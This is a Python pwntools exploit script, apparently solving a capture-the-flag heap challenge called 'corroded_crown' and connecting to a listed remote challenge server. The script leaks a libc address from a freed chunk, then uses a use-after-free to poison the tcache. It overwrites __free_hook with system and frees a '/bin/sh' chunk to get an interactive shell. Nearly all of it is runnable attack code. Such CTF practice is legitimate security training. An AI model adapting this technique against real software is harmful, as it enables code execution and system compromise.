#!/usr/bin/env python3

from pwn import *

exe = ELF('corroded_crown_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.terminal = [ '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '--size', '0.6', '-d', '.', 'wsl.exe','-d', 'Parrot', 'bash', '-c' ]

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        brva 0x12c0
        brva 0x130d
        brva 0x0000000000001664
        c
        ''')
        input()

if args.REMOTE:
    p = remote('154.57.164.73', 31540)
elif args.DOCKER:
    p = remote('')
else:
    p = process([exe.path])
    
GDB()

def add(index, size):
    slna(b'> ', 1)
    slna(b'(index): ', index)
    slna(b'(size): ', size)

def delete(index):
    slna(b'> ', 4)
    slna(b'(index): ', index)

def write(index):
    slna(b'> ', 3)
    slna(b'(index): ', index)

def read(index, data):
    slna(b'> ', 2)
    slna(b'(index): ', index)
    sla(b'bytes):\n', data)


add(0, 0x500)
add(1, 0x50)
add(2, 0x50)
delete(0)
write(0)
p.recvuntil(b': ')
leak = u64(p.recv(8))
info("libc leak: " + hex(leak))
libc.address = leak - 0x1ecbe0
info("libc base: " + hex(libc.address))
delete(1)
delete(2)
read(2, p64(libc.sym.__free_hook))
add(3, 0x50)
add(4, 0x50)
read(3, b'/bin/sh')
read(4, p64(libc.sym.system))
delete(3)

p.interactive()

